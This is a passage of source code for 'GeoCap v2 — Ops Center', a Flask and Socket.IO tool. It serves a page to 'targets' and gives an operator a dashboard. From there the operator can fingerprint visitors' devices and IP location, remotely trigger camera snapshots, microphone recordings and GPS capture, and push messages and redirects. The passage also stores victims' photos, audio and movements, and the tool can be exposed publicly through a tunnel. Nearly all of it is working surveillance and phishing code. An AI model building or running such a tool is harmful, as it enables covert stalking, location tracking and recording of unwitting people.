          Recording ${i+1} — ${a.timestamp} 
          <span style="color:var(--text3)">(${a.duration?.toFixed(1)}s, ${(a.size/1024).toFixed(1)}KB)</span>
        </div>
        <audio controls preload="metadata">
          <source src="/files/${c.id || SEL}/${a.ip}/${a.filename}" type="${mimeType}">
          Your browser does not support the audio element.
        </audio>
      </div>
    `;
  }).join('');
}

/* ═══ System Info ═══ */
function renderSysInfo(c) {
  const di=c.device_info||{};
  const sections=[
    {title:'Device',icon:'fa-mobile-screen',clr:'var(--cyan)',bg:'var(--cyan-dim)',key:'device',
     data:{Type:di.deviceDetails?.type,OS:di.deviceDetails?.os,Browser:di.deviceDetails?.browser,
       Mobile:di.deviceDetails?.isMobile,Tablet:di.deviceDetails?.isTablet,
       'Touch Device':di.deviceDetails?.isTouchDevice,Platform:di.platform,
       'User Agent':di.userAgent}},
    {title:'Screen',icon:'fa-display',clr:'var(--purple)',bg:'rgba(168,85,247,.15)',key:'screen',
     data:{Resolution:`${di.screenWidth}×${di.screenHeight}`,'Color Depth':`${di.colorDepth} bit`,'Pixel Depth':`${di.pixelDepth} bit`}},
    {title:'Hardware & CPU',icon:'fa-microchip',clr:'var(--yellow)',bg:'var(--yellow-dim)',key:'hw',
     data:{'CPU Cores':di.hardwareConcurrency,'RAM':di.deviceMemory?`${di.deviceMemory} GB`:'unknown',
       'Max Touch Points':di.maxTouchPoints,'PDF Viewer':di.pdfViewerEnabled,'Webdriver':di.webdriver}},
    {title:'GPU',icon:'fa-server',clr:'var(--purple)',bg:'rgba(168,85,247,.15)',key:'gpu',
     data:{'Vendor (unmasked)':di.gpu?.vendor||di.webGL?.vendor,'Renderer (unmasked)':di.gpu?.renderer||di.webGL?.renderer,
       'WebGL Version':di.webGL?.version,'GLSL Version':di.webGL?.shadingLanguageVersion}},
    {title:'Battery',icon:'fa-battery-half',clr:'var(--green)',bg:'var(--green-dim)',key:'bat',
     data:di.battery?{'Level':`${Math.round(di.battery.level*100)}%`,'Charging':di.battery.charging?'Yes':'No',
       'Charging Time':di.battery.chargingTime===0?'Fully Charged':(di.battery.chargingTime?`${Math.round(di.battery.chargingTime/60)}m`:'N/A'),
       'Discharging Time':di.battery.dischargingTime?`${Math.round(di.battery.dischargingTime/60)}m`:'N/A'}:{'Status':'Not available'}},
    {title:'Network',icon:'fa-wifi',clr:'var(--cyan)',bg:'var(--cyan-dim)',key:'net',
     data:di.connection?{Type:di.connection.effectiveType,'Downlink':`${di.connection.downlink} Mbps`,
       RTT:`${di.connection.rtt} ms`,'Save Data':di.connection.saveData}:{'Status':'Not available'}},
    {title:'IP Info',icon:'fa-location-dot',clr:'var(--red)',bg:'var(--red-dim)',key:'ip',
     data:di.ipInfo?{IP:di.ipInfo.ip,City:di.ipInfo.city,Region:di.ipInfo.region,Country:di.ipInfo.country,
       Postal:di.ipInfo.postal,'Coordinates':`${di.ipInfo.latitude}, ${di.ipInfo.longitude}`,
       'ISP/Org':di.ipInfo.org,Timezone:di.ipInfo.timezone}:{'Status':'Not available'}},
    {title:'Language & Browser',icon:'fa-globe',clr:'var(--cyan)',bg:'var(--cyan-dim)',key:'lang',
     data:{Language:di.language,Languages:(di.languages||[]).join(', '),Timezone:di.timezone,
       Cookies:di.cookiesEnabled,'Do Not Track':di.doNotTrack}},
    {title:'Permissions',icon:'fa-shield-halved',clr:'var(--yellow)',bg:'var(--yellow-dim)',key:'perms',
     data:di.permissions||{}},
    {title:'Audio Context',icon:'fa-waveform-lines',clr:'var(--green)',bg:'var(--green-dim)',key:'actx',
     data:di.audioContext||{}},
    {title:'Storage',icon:'fa-hard-drive',clr:'var(--cyan)',bg:'var(--cyan-dim)',key:'stor',
     data:di.storage?{'Quota':di.storage.estimate?.quota?`${(di.storage.estimate.quota/1e9).toFixed(2)} GB`:'N/A',
       'Usage':di.storage.estimate?.usage?`${(di.storage.estimate.usage/1e6).toFixed(2)} MB`:'N/A',
       'Persisted':di.storage.persisted}:{'Status':'Not available'}},
    {title:'Media Devices',icon:'fa-camera-web',clr:'var(--purple)',bg:'rgba(168,85,247,.15)',key:'mdev',
     data:Object.fromEntries((di.mediaDevices||[]).map((d,i)=>[`${d.kind} ${i+1}`,d.label||`Device ${i+1}`]))},
    {title:'Installed Fonts',icon:'fa-font',clr:'var(--text2)',bg:'rgba(136,153,187,.12)',key:'fonts',
     data:{Fonts:(di.fonts||[]).join(', ')||'None detected'}},
    {title:'Browser Plugins',icon:'fa-puzzle-piece',clr:'var(--text3)',bg:'rgba(74,88,120,.15)',key:'plug',
     data:Object.fromEntries((di.plugins||[]).map((p,i)=>[`Plugin ${i+1}`,p.name]))},
    {title:'Performance',icon:'fa-gauge-high',clr:'var(--yellow)',bg:'var(--yellow-dim)',key:'perf',
     data:di.performance?{
       'JS Heap Limit':di.performance.memory?.jsHeapSizeLimit?`${(di.performance.memory.jsHeapSizeLimit/1e6).toFixed(0)} MB`:'N/A',
       'Used Heap':di.performance.memory?.usedJSHeapSize?`${(di.performance.memory.usedJSHeapSize/1e6).toFixed(0)} MB`:'N/A',
       'Page Load':di.performance.timing?.loadEventEnd&&di.performance.timing?.navigationStart
         ?`${di.performance.timing.loadEventEnd-di.performance.timing.navigationStart}ms`:'N/A'
     }:{'Status':'Not available'}},
  ];

  document.getElementById('siCards').innerHTML=sections.map(s=>{
    const entries=Object.entries(s.data||{}).filter(([,v])=>v!==undefined&&v!==null&&v!=='');
    const rows=entries.map(([k,v])=>`<div class="ir"><span class="il">${k}</span><span class="iv">${v}</span></div>`).join('');
    return `<div class="card">
      <div class="card-head">
        <div class="card-icon" style="background:${s.bg}"><i class="fa-solid ${s.icon}" style="color:${s.clr}"></i></div>
        <span class="card-title">${s.title}</span>
        <button class="cbtn" onclick="cpSection('${s.key}')"><i class="fa-regular fa-copy"></i> Copy</button>
      </div>
      <div class="card-body" id="si-${s.key}">${rows||'<div style="color:var(--text3);font-family:var(--mono);font-size:11px;text-align:center;padding:10px">No data</div>'}</div>
    </div>`;
  }).join('');

  // Store section data for copy
  window._siSections=Object.fromEntries(sections.map(s=>[s.key,s.data]));
}

/* ═══ Proxy UI ═══ */
function syncProxyUI() {
  const sel=document.getElementById('proxySel');
  sel.innerHTML='<option value="">— Proxy URLs —</option>'+PURLS.map((u,i)=>`<option value="${u}">${u}</option>`).join('');
  document.getElementById('proxyWrap').style.display=PURLS.length?'flex':'none';
  renderPurlList();
}

function renderPurlList() {
  const el=document.getElementById('purlList'); if(!el) return;
  el.innerHTML=PURLS.map((url,i)=>`
    <div class="purl-item">
      <div class="pu">${url}</div>
      <button class="cbtn" onclick="cp('${url}')"><i class="fa-regular fa-copy"></i></button>
      <button class="abtn d" style="padding:4px 8px;font-size:11px" onclick="doRedirUrl('${url}')">Send</button>
      <button class="abtn" style="padding:4px 8px;font-size:11px" onclick="rmProxy(${i})"><i class="fa-solid fa-trash"></i></button>
    </div>`).join('');
}

function addProxy() {
  let u=document.getElementById('newPurl').value.trim(); if(!u) return;
  if(!u.startsWith('http')) u='https://'+u;
  fetch('/api/proxy_url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u})})
    .then(r=>r.json()).then(d=>{ PURLS=d.proxy_urls; syncProxyUI(); toast('Proxy URL added'); });
  document.getElementById('newPurl').value='';
}

function rmProxy(i) {
  fetch('/api/proxy_url/'+i,{method:'DELETE'}).then(r=>r.json()).then(d=>{ PURLS=d.proxy_urls; syncProxyUI(); });
}

function cpProxy() {
  const v=document.getElementById('proxySel').value; if(v) cp(v);
}

function sendCmd(type, extra={}) {
  if(!SEL) return;
  const requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  const payload = {type, requestId, ...extra};
  
  // Show pending badge
  const badgeTypes = {
    'trigger_location': 'locRequestBadge',
    'trigger_camera': 'camRequestBadge',
    'trigger_audio': 'audioRequestBadge'
  };
  
  if(badgeTypes[type]) {
    const badge = document.getElementById(badgeTypes[type]);
    if(badge) {
      badge.style.display = 'inline-flex';
      badge.className = 'request-badge pending';
      badge.innerHTML = `<i class="fa-solid fa-circle"></i> ${type.replace('trigger_','')}: pending`;
    }
  }
  
  fetch('/api/send/'+SEL, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
  
  toast('Command sent: ' + type);
 
  if(type === 'trigger_audio') {
    // Show recording indicator for 10s
    const wrap  = document.getElementById('recBtnWrap');
    const stat  = document.getElementById('recStatus');
    const timer = document.getElementById('recTimer');
    const btn   = document.getElementById('recBtn');
    if(!wrap) return;
    wrap.classList.add('recording');
    stat.style.display = 'block';
    btn.disabled = true;
    let t = 10;
    timer.textContent = t;
    const iv = setInterval(() => {
      t--;
      timer.textContent = t;
      if(t <= 0) {
        clearInterval(iv);
        wrap.classList.remove('recording');
        stat.style.display = 'none';
        btn.disabled = false;
      }
    }, 1000);
  }
}

function doMsg() {
  const title=document.getElementById('msgTitle').value;
  const body=document.getElementById('msgBody').value;
  if(!body||!SEL) return;
  sendCmd('trigger_message',{title,body});
  document.getElementById('msgBody').value='';
}

function doRedir() {
  let url=document.getElementById('redirUrl').value.trim(); if(!url||!SEL) return;
  if(!url.startsWith('http')) url='https://'+url;
  sendCmd('redirect',{url}); document.getElementById('redirUrl').value='';
}

function doRedirUrl(url) { if(SEL) sendCmd('redirect',{url}); }

function openMap() {
  const c=C[SEL]; if(!c?.last_location) return;
  const {lat,lon}=c.last_location;
  window.open(`https://maps.google.com/?q=${lat},${lon}`,'_blank');
}

/* ═══ Copy Utilities ═══ */
function cp(text) {
  navigator.clipboard.writeText(text).then(()=>toast('Copied!')).catch(()=>{
    const ta=document.createElement('textarea'); ta.value=text;
    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); toast('Copied!');
  });
}

function cpCard(id) {
  const el=document.getElementById(id); if(!el) return;
  const obj={};
  el.querySelectorAll('.ir').forEach(r=>{ const k=r.querySelector('.il')?.textContent; const v=r.querySelector('.iv')?.textContent; if(k) obj[k]=v; });
  cp(JSON.stringify(obj,null,2));
}

function cpSection(key) {
  const data=(window._siSections||{})[key];
  cp(JSON.stringify(data||{},null,2));
}

function cpAll() {
  const c=C[SEL]; if(!c) return;
  cp(JSON.stringify(c.device_info||{},null,2));
  toast('All system data copied!');
}

function cpPhotoPaths() {
  const c=C[SEL]; if(!c) return;
  const paths=(c.photos||[]).map(p=>`/files/${SEL}/${p.ip}/${p.filename}`);
  cp(paths.join('\n'));
}

/* ═══ Image Modal ═══ */
function showImg(url, width, height) {
  document.getElementById('imgModalSrc').src=url;
  const dims = document.getElementById('imgModalDims');
  if(width && height) {
    dims.textContent = `${width} × ${height}`;
  } else {
    dims.textContent = '';
  }
  document.getElementById('imgModal').style.display='flex';
}

/* ═══ Tabs ═══ */
function tab(name) {
  document.querySelectorAll('.tn').forEach(b=>b.classList.toggle('on',b.dataset.t===name));
  document.querySelectorAll('.tab-body').forEach(t=>t.classList.toggle('on',t.id==='tb-'+name));
}

/* ═══ Toast ═══ */
let _tt; function toast(m) {
  clearTimeout(_tt);
  document.getElementById('toastMsg').textContent=m;
  document.getElementById('toast').classList.add('show');
  _tt=setTimeout(()=>document.getElementById('toast').classList.remove('show'),2400);
}

/* ═══ Time Display ═══ */
function ago(iso) {
  if(!iso) return '';
  const d=Date.now()-new Date(iso).getTime();
  if(d<10000) return 'just now';
  if(d<60000) return Math.floor(d/1000)+'s ago';
  if(d<3600000) return Math.floor(d/60000)+'m ago';
  return Math.floor(d/3600000)+'h ago';
}

setInterval(()=>{
  if(SEL&&C[SEL]?.last_seen) document.getElementById('chTime').textContent='Last: '+ago(C[SEL].last_seen);
  // Refresh location time display
  if(SEL&&C[SEL]?.last_location?.timestamp){
    const acc=C[SEL].last_location.accuracy;
    document.getElementById('locAcc').textContent=`±${acc?.toFixed(0)}m accuracy  ·  Updated ${ago(C[SEL].last_location.timestamp)}`;
  }
}, 1000);

// Periodic full sync as safety net
setInterval(()=>{ fetch('/api/clients').then(r=>r.json()).then(applyClients); }, 12000);
</script>
</body>
</html>"""


# ═══════════════════════════════════════════════════════════════
#  FLASK ROUTES — Pages
# ═══════════════════════════════════════════════════════════════
@app.route("/")
def visitor():
    return VISITOR_HTML

@app.route(f"/{admin_secret}")
def admin_page():
    # Replace placeholder with actual secret
    html = ADMIN_HTML.replace('ADMIN_SECRET_PLACEHOLDER', admin_secret)
    return html

@app.route("/files/<client_id>/<path:filepath>")
def serve_file(client_id, filepath):
    base = os.path.join(DATA_DIR, safe_name(client_id))
    
    # Determine MIME type based on file extension
    if filepath.endswith('.mp3'):
        mimetype = 'audio/mpeg'
    elif filepath.endswith('.m4a'):
        mimetype = 'audio/mp4'
    elif filepath.endswith('.ogg'):
        mimetype = 'audio/ogg'
    elif filepath.endswith('.webm'):
        mimetype = 'audio/webm'
    elif filepath.endswith('.jpg') or filepath.endswith('.jpeg'):
        mimetype = 'image/jpeg'
    else:
        mimetype = None
    
    return send_from_directory(base, filepath, mimetype=mimetype)

# ═══════════════════════════════════════════════════════════════
#  FLASK ROUTES — API
# ═══════════════════════════════════════════════════════════════
@app.route("/api/state")
def api_state():
    return jsonify({"mode": op_mode, "cf_url": cf_url, "proxy_urls": proxy_urls})

@app.route("/api/mode", methods=["POST"])
def api_mode():
    global op_mode, cf_url, cf_proc
    mode = request.json.get("mode")
    op_mode = mode
    if mode == "global":
        result = start_cloudflared()
        if result["success"]:
            cf_url = result["url"]
            notify_admins("state_update", {"mode": mode, "cf_url": cf_url, "proxy_urls": proxy_urls})
            return jsonify({"status": "ok", "url": cf_url})
        op_mode = None
        return jsonify({"status": "error", "error": result["error"]})
    else:
        local_ip = get_public_ip()
        local_url = f"http://{local_ip}:{PORT}"
        notify_admins("state_update", {"mode": mode, "cf_url": local_url, "proxy_urls": proxy_urls})
        return jsonify({"status": "ok", "url": local_url})

@app.route("/api/clients")
def api_clients():
    return jsonify(clients)

@app.route("/api/client/<cid>")
def api_client(cid):
    return jsonify(clients.get(cid, {}))

@app.route("/api/old_clients")
def api_old_clients():
    """Get list of historical clients with summary data"""
    old_clients = []
    try:
        for client_dir in os.listdir(DATA_DIR):
            client_path = os.path.join(DATA_DIR, client_dir)
            if os.path.isdir(client_path):
                # Get client info
                info = {
                    "id": client_dir,
                    "first_seen": "Unknown",
                    "last_ip": "Unknown",
                    "photo_count": 0,
                    "audio_count": 0,
                    "location_count": 0
                }
                
                # Check for device_info.json
                info_file = os.path.join(client_path, "device_info.json")
                if os.path.exists(info_file):
                    try:
                        with open(info_file) as f:
                            device_info = json.load(f)
                            info["first_seen"] = device_info.get("timestamp", "Unknown")
                            if device_info.get("ipInfo"):
                                info["last_ip"] = device_info["ipInfo"].get("ip", "Unknown")
                    except:
                        pass
                
                # Count photos
                for subdir in os.listdir(client_path):
                    sub_path = os.path.join(client_path, subdir)
                    if os.path.isdir(sub_path):
                        photo_dir = os.path.join(sub_path, "photos")
                        if os.path.exists(photo_dir):
                            info["photo_count"] += len([f for f in os.listdir(photo_dir) if f.endswith('.jpg')])
                        
                        audio_dir = os.path.join(sub_path, "audio")
                        if os.path.exists(audio_dir):
                            info["audio_count"] += len([f for f in os.listdir(audio_dir) if f.endswith('.webm')])
                        
                        loc_file = os.path.join(sub_path, "locations.json")
                        if os.path.exists(loc_file):
                            try:
                                with open(loc_file) as f:
                                    info["location_count"] += len(json.load(f))
                            except:
                                pass
                
                old_clients.append(info)
    except Exception as e:
        print(f"Error loading old clients: {e}")
    
    return jsonify(old_clients)

@app.route("/api/old_client/<cid>")
def api_old_client(cid):
    """Load complete historical data for a client"""
    try:
        client_path = os.path.join(DATA_DIR, safe_name(cid))
        if not os.path.exists(client_path):
            return jsonify({"error": "Client not found"}), 404
        
        client_data = {
            "id": cid,
            "device_info": {},
            "photos": [],
            "audios": [],
            "locations": [],
            "online": False
        }
        
        # Load device info from most recent session
        for subdir in sorted(os.listdir(client_path), reverse=True):
            sub_path = os.path.join(client_path, subdir)
            if os.path.isdir(sub_path):
                info_file = os.path.join(sub_path, "device_info.json")
                if os.path.exists(info_file) and not client_data["device_info"]:
                    with open(info_file) as f:
                        client_data["device_info"] = json.load(f)
                
                # Load photos
                photo_dir = os.path.join(sub_path, "photos")
                if os.path.exists(photo_dir):
                    for photo in os.listdir(photo_dir):
                        if photo.endswith('.jpg'):
                            client_data["photos"].append({
                                "filename": f"photos/{photo}",
                                "ip": subdir,
                                "timestamp": photo.replace('photo_', '').replace('.jpg', '').split('_')[0],
                                "facingMode": "user" if "user" in photo else "environment"
                            })
                
                # Load audio
                audio_dir = os.path.join(sub_path, "audio")
                if os.path.exists(audio_dir):
                    for audio in os.listdir(audio_dir):
                        if audio.endswith('.webm'):
                            client_data["audios"].append({
                                "filename": f"audio/{audio}",
                                "ip": subdir,
                                "timestamp": audio.replace('audio_', '').replace('.webm', '')
                            })
                
                # Load locations
                loc_file = os.path.join(sub_path, "locations.json")
                if os.path.exists(loc_file):
                    with open(loc_file) as f:
                        locs = json.load(f)
                        if locs:
                            client_data["last_location"] = locs[-1]
                            client_data["locations"] = locs
        
        return jsonify(client_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/proxy_url", methods=["POST"])
def api_add_proxy():
    url = request.json.get("url")
    if url and url not in proxy_urls:
        proxy_urls.append(url)
        notify_admins("state_update", {"proxy_urls": proxy_urls})
    return jsonify({"proxy_urls": proxy_urls})

@app.route("/api/proxy_url/<int:idx>", methods=["DELETE"])
def api_del_proxy(idx):
    if 0 <= idx < len(proxy_urls):
        proxy_urls.pop(idx)
        notify_admins("state_update", {"proxy_urls": proxy_urls})
    return jsonify({"proxy_urls": proxy_urls})

@app.route("/api/send/<cid>", methods=["POST"])
def api_send(cid):
    data = request.json
    c = clients.get(cid)
    if not c or not c.get("online"):
        return jsonify({"status": "error", "message": "Client offline or not found"})
    
    sid = c.get("socket_id")
    t = data.get("type")
    
    # Track the request
    request_id = data.get("requestId")
    if request_id:
        request_states[request_id] = {
            "client_id": cid,
            "type": t.replace("trigger_", ""),
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        }
    
    if t == "trigger_location":
        socketio.emit("trigger_location", {
            "title": data.get("title"), 
            "message": data.get("message"), 
            "requestId": request_id
        }, room=sid)
    elif t == "trigger_camera":
        socketio.emit("trigger_camera", {
            "facingMode": data.get("facingMode", "user"), 
            "requestId": request_id
        }, room=sid)
    elif t == "trigger_audio":
        socketio.emit("trigger_audio", {"requestId": request_id}, room=sid)
    elif t == "trigger_message":
        socketio.emit("trigger_message", {
            "title": data.get("title"), 
            "body": data.get("body")
        }, room=sid)
    elif t == "redirect":
        socketio.emit("redirect", {"url": data.get("url")}, room=sid)
    
    return jsonify({"status": "ok"})


# ═══════════════════════════════════════════════════════════════
#  FLASK ROUTES — Client Data Ingestion
# ═══════════════════════════════════════════════════════════════
@app.route("/device_info", methods=["POST"])
def device_info():
    data = request.json
    cid  = data.get("client_id")
    sid  = data.get("socket_id")
    if not cid:
        return jsonify({"status": "error"})

    ip = request.remote_addr
    if cid not in clients:
        clients[cid] = {
            "id": cid, 
            "socket_id": sid,
            "first_seen": datetime.now().isoformat(),
            "online": True, 
            "photos": [], 
            "audios": [],
            "current_ip": ip
        }
    else:
        # Merge device_info (ip_info may arrive in a second call)
        existing_di = clients[cid].get("device_info", {})
        new_di = data.copy()
        if "ipInfo" in new_di and not new_di["ipInfo"]:
            new_di.pop("ipInfo")  # don't overwrite with empty
        existing_di.update({k: v for k, v in new_di.items() if v})
        data = existing_di

    clients[cid].update({
        "socket_id": sid,
        "last_seen": datetime.now().isoformat(),
        "current_ip": ip,
        "device_info": data,
        "online": True
    })
    sid_to_cid[sid] = cid

    # Persist
    folder = client_folder(cid, ip)
    info_path = os.path.join(folder, "device_info.json")
    try:
        existing = {}
        if os.path.exists(info_path):
            with open(info_path) as f:
                existing = json.load(f)
        existing.update(data)
        existing["timestamp"] = datetime.now().isoformat()
        with open(info_path, "w") as f:
            json.dump(existing, f, indent=2)
    except Exception as e:
        print(f"Error saving device info: {e}")

    notify_admins("client_update", clients[cid])
    return jsonify({"status": "ok"})

@app.route("/request_status", methods=["POST"])
def request_status():
    data = request.json
    request_id = data.get("requestId")
    status = data.get("status")
    client_id = data.get("client_id")
    error = data.get("error")
    
    if request_id and request_id in request_states:
        request_states[request_id].update({
            "status": status,
            "error": error,
            "updated_at": datetime.now().isoformat()
        })
        
        # Notify admins
        notify_admins("request_status", {
            "requestId": request_id,
            "clientId": client_id,
            "type": request_states[request_id]["type"],
            "status": status,
            "error": error
        })
    
    return jsonify({"status": "ok"})

@app.route("/location_update", methods=["POST"])
def location_update():
    data = request.json
    cid  = data.get("client_id")
    if cid not in clients:
        return jsonify({"status": "error"})

    if data.get("denied"):
        clients[cid]["location_denied"] = True
    else:
        loc = {
            "lat": data.get("lat"), 
            "lon": data.get("lon"),
            "accuracy": data.get("accuracy"), 
            "altitude": data.get("altitude"),
            "heading": data.get("heading"), 
            "speed": data.get("speed"),
            "timestamp": datetime.now().isoformat()
        }
        clients[cid]["last_location"] = loc
        clients[cid]["auto_location"] = True

        ip = clients[cid].get("current_ip", "unknown")
        folder = client_folder(cid, ip)
        lf = os.path.join(folder, "locations.json")
        locs = []
        if os.path.exists(lf):
            try:
                with open(lf) as f: 
                    locs = json.load(f)
            except Exception: 
                pass
        locs.append(loc)
        try:
            with open(lf, "w") as f: 
                json.dump(locs, f, indent=2)
        except Exception as e:
            print(f"Error saving location: {e}")

    notify_admins("client_update", clients[cid])
    return jsonify({"status": "ok"})


@app.route("/upload_snapshot", methods=["POST"])
def upload_snapshot():
    data = request.json
    cid  = data.get("client_id")
    if cid not in clients:
        return jsonify({"status": "error"})

    if data.get("denied"):
        clients[cid]["camera_denied"] = True
        notify_admins("client_update", clients[cid])
        return jsonify({"status": "ok"})

    img_b64 = data.get("image", "").split(",")[-1]
    facing  = data.get("facingMode", "user")
    dimensions = data.get("dimensions", {})
    ts      = int(time.time())
    fname   = f"photo_{ts}_{facing}.jpg"

    ip      = clients[cid].get("current_ip", "unknown")
    folder  = client_folder(cid, ip)
    pdir    = os.path.join(folder, "photos")
    os.makedirs(pdir, exist_ok=True)

    try:
        with open(os.path.join(pdir, fname), "wb") as f:
            f.write(base64.b64decode(img_b64))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

    clients[cid]["photos"].append({
        "filename": f"photos/{fname}",
        "ip": safe_name(ip),
        "timestamp": datetime.now().isoformat(),
        "facingMode": facing,
        "width": dimensions.get("width"),
        "height": dimensions.get("height")
    })
    notify_admins("client_update", clients[cid])
    return jsonify({"status": "ok"})


@app.route("/upload_audio", methods=["POST"])
def upload_audio():
    data = request.json
    cid  = data.get("client_id")
    if cid not in clients:
        return jsonify({"status": "error"})

    if data.get("denied"):
        clients[cid]["mic_denied"] = True
        notify_admins("client_update", clients[cid])
        return jsonify({"status": "ok"})

    audio_b64 = data.get("audio", "")
    duration = data.get("duration", 0)
    file_extension = data.get("fileExtension", "webm")
    mime_type = data.get("mimeType", "audio/webm")
    ts        = int(time.time())
    
    # Generate filename with proper extension
    fname     = f"audio_{ts}_{int(duration)}s.{file_extension}"

    ip        = clients[cid].get("current_ip", "unknown")
    folder    = client_folder(cid, ip)
    adir      = os.path.join(folder, "audio")
    os.makedirs(adir, exist_ok=True)
    
    filepath = os.path.join(adir, fname)
    
    try:
        # Decode and save the audio file
        audio_data = base64.b64decode(audio_b64)
        
        if len(audio_data) == 0:
            return jsonify({"status": "error", "message": "Empty audio data"})
            
        with open(filepath, "wb") as f:
            f.write(audio_data)
            
        print(f"[+] Saved audio: {filepath} ({len(audio_data)} bytes, {duration}s, type: {mime_type})")
        
    except Exception as e:
        print(f"[-] Error saving audio: {e}")
        return jsonify({"status": "error", "message": str(e)})

    # Add to client record with correct MIME type for serving
    if "audios" not in clients[cid]:
        clients[cid]["audios"] = []
        
    clients[cid]["audios"].append({
        "filename": f"audio/{fname}",
        "ip": safe_name(ip),
        "timestamp": datetime.now().isoformat(),
        "duration": duration,
        "size": len(audio_data),
        "mime_type": mime_type  # Store MIME type for serving
    })
    
    notify_admins("client_update", clients[cid])
    return jsonify({"status": "ok"})

@app.route("/upload_audio_chunk", methods=["POST"])
def upload_audio_chunk():
    data = request.json
    cid  = data.get("client_id")
    if cid not in clients:
        return jsonify({"status": "error"})

    if data.get("denied"):
        clients[cid]["mic_denied"] = True
        notify_admins("client_update", clients[cid])
        return jsonify({"status": "ok"})

    audio_b64 = data.get("audio", "")
    chunk_index = data.get("chunkIndex", 0)
    is_final = data.get("isFinal", False)
    request_id = data.get("requestId")
    ts        = int(time.time())
    
    # Create a temporary chunk file
    ip        = clients[cid].get("current_ip", "unknown")
    folder    = client_folder(cid, ip)
    temp_dir  = os.path.join(folder, "audio_temp")
    os.makedirs(temp_dir, exist_ok=True)
    
    # Save chunk
    chunk_file = os.path.join(temp_dir, f"chunk_{request_id}_{chunk_index}.webm")
    try:
        with open(chunk_file, "wb") as f:
            f.write(base64.b64decode(audio_b64))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})
    
    # If this is marked as final, we could combine chunks here
    # But we'll rely on the final /upload_audio for the complete file
    
    return jsonify({"status": "ok", "chunk": chunk_index})

# ═══════════════════════════════════════════════════════════════
#  SOCKET.IO EVENTS
# ═══════════════════════════════════════════════════════════════
@socketio.on("connect")
def on_client_connect():
    pass

@socketio.on("disconnect")
def on_client_disconnect():
    sid = request.sid
    cid = sid_to_cid.pop(sid, None)
    if cid and cid in clients:
        clients[cid]["online"] = False
        clients[cid]["last_seen"] = datetime.now().isoformat()
        notify_admins("client_update", clients[cid])

@socketio.on("connect", namespace=f"/{admin_secret}")
def on_admin_connect():
    emit("state_update", {"mode": op_mode, "cf_url": cf_url, "proxy_urls": proxy_urls})
    emit("clients_update", clients)

@socketio.on("disconnect", namespace=f"/{admin_secret}")
def on_admin_disconnect():
    pass

# ═══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════
def run_flask():
    socketio.run(
        app,
        host="0.0.0.0",
        port=PORT,
        debug=False,
        use_reloader=False,
        allow_unsafe_werkzeug=True,
    )


def on_window_closed():
    global cf_proc
    if cf_proc:
        try:
            cf_proc.terminate()
        except Exception:
            pass
    os._exit(0)


if __name__ == "__main__":
    # Find a free port
    try:
        PORT = find_free_port()
        print(f"[+] Using port {PORT}")
        print(f"[+] Admin panel: http://127.0.0.1:{PORT}/{admin_secret}")
        print(f"[+] Share this URL with targets: http://{get_public_ip()}:{PORT}/")
    except RuntimeError as e:
        print(f"[-] {e}")
        sys.exit(1)

    # Start Flask + Socket.IO in background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Give Flask a moment to bind
    time.sleep(1.2)

    # Open pywebview pointing at the admin dashboard with secret path
    window = webview.create_window(
        title="GeoCap v2 — Ops Center",
        url=f"http://127.0.0.1:{PORT}/{admin_secret}",
        width=1400,
        height=860,
        min_size=(1100, 660),
        resizable=True,
        background_color="#06080f",
        text_select=False,
    )
    webview.start(debug=False)
    on_window_closed()